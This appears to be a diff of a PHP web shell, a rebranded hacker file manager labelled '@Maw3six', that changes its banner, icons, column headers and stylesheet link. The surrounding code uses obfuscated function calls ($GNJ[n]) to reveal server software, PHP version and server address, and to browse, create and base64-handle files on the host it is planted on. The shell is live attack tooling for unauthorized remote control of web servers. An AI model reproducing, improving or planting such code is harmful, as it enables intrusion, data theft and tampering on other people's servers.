@@ -48,8 +48,14 @@ for($i=0;$i<$___;$i++) {
 <!DOCTYPE html>
 	<html dir="auto" lang="en-US">
 
-			<link rel="icon" href="//pngplay.com/wp-content/uploads/13/Snowflake-Transparent-Background.png" />
-			<link rel="stylesheet" href="https://negat1ve1337.github.io/Shell/main.css" type="text/css">
+		<head>
+			<meta charset="UTF-8">
+			<meta name="robots" content="NOINDEX, NOFOLLOW">
+
+				<title>@Maw3six</title>
+
+			<link rel="icon" href="icon.png" />
+			<link rel="stylesheet" href="main.css" type="text/css">
 
 			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
@@ -59,27 +65,28 @@ for($i=0;$i<$___;$i++) {
 			<header>
 				<div class="y x">
 					<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
-						Vim Patior					</a>
+						@Maw3six
+					</a>
 				</div>
 
 				<div class="q x w">
-					
+					&#8212; SENIN &#8212; SELASA &#8212; RABU &#8212; KAMIS &#8212; JUMAT &#8212; SABTU &#8212;
 				</div>
 				
 			</header>
 
 			<article>
 				<div class="i">
-					<i class="far fa-snowflake"></i>
+					<i class="far fa-hdd"></i>
 					<?php echo $GNJ[0]();?>
 
 					<br />
 
-					<i class="far fa-snowflake"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
+					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
 
 					<br />
 
-					<i class="far fa-snowflake"></i>
+					<i class="far fa-folder"></i>
 					
 					<?php
 					if(isset($_GET["d"])) {
@@ -113,7 +120,7 @@ for($i=0;$i<$___;$i++) {
 				</div>
 
 				<div class="u">
-					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-snowflake"></i>
+					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
 					<br />
 
 					<br />
@@ -200,8 +207,8 @@ for($i=0;$i<$___;$i++) {
 										<br />
 										<span class="w">BASE64</span> :
 										<select id="b64" name="b64">
-											<option value="0">X</option>
-											<option value="1">Y</option>
+											<option value="0">NO</option>
+											<option value="1">YES</option>
 										</select>
 										'.$d_.'
 								'.$c_.'
@@ -362,18 +369,18 @@ for($i=0;$i<$___;$i++) {
 					echo '<table cellspacing="0" cellpadding="7" width="100%">
 						<thead>
 							<tr>
-								<th width="44%">[ Behemoth ]</th>
-								<th width="11%">[ Beelzebub ]</th>
-								<th width="17%">[ Asmodeus ]</th>
-								<th width="17%">[ Satanas ]</th>
-								<th width="11%">[ Lucifer ]</th>
+								<th width="44%">[ NAME ]</th>
+								<th width="11%">[ SIZE ]</th>
+								<th width="17%">[ PERM ]</th>
+								<th width="17%">[ DATE ]</th>
+								<th width="11%">[ ACT ]</th>
 							</tr>
 						</thead>
 						<tbody>
 							<tr>
 								<td>
-									<a class="ajx" href="?d='.hex($d).'&n">Add File</a>
-									<a class="ajx" href="?d='.hex($d).'&l">Add Dir</a>
+									<a class="ajx" href="?d='.hex($d).'&n">+FILE</a>
+									<a class="ajx" href="?d='.hex($d).'&l">+DIR</a>
 								</td>
 							</tr>
 						';
@@ -410,7 +417,7 @@ for($i=0;$i<$___;$i++) {
 								($GNJ[8]("$d/$c")) ?
 								$h .= '<tr class="r">
 							<td>
-								<i class="far fa-snowflake m"></i>
+								<i class="far fa-folder m"></i>
 								<a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
 							</td>
 							<td class="x">
@@ -432,7 +439,7 @@ for($i=0;$i<$___;$i++) {
 							:
 								$j .= '<tr class="r">
 							<td>
-								<i class="far fa-snowflake m"></i>&thinsp;
+								<i class="far fa-file m"></i>&thinsp;
 								<a class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
 							</td>
 							<td class="x">
@@ -480,7 +487,7 @@ for($i=0;$i<$___;$i++) {
 
 			</article>
 			<footer class="x">
-				
+				&copy;maw3six
 			</footer>
 			<?php
 			if(isset($_GET["1"])) {
